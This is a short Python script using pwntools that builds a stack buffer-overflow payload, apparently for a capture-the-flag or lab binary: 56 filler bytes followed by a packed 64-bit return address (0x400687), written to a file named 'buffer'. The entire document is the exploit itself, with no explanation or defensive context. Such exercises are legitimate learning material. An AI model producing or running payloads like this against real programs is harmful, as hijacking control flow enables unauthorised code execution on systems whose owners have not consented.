from pwn import *

address = p64(0x400687)
buf = b"abcdefghijlmnopqrstuvwxyzabcdefghijlmnopqrstuvwxyzabcdef" + address

with open("buffer", "wb") as f:
    f.write(buf)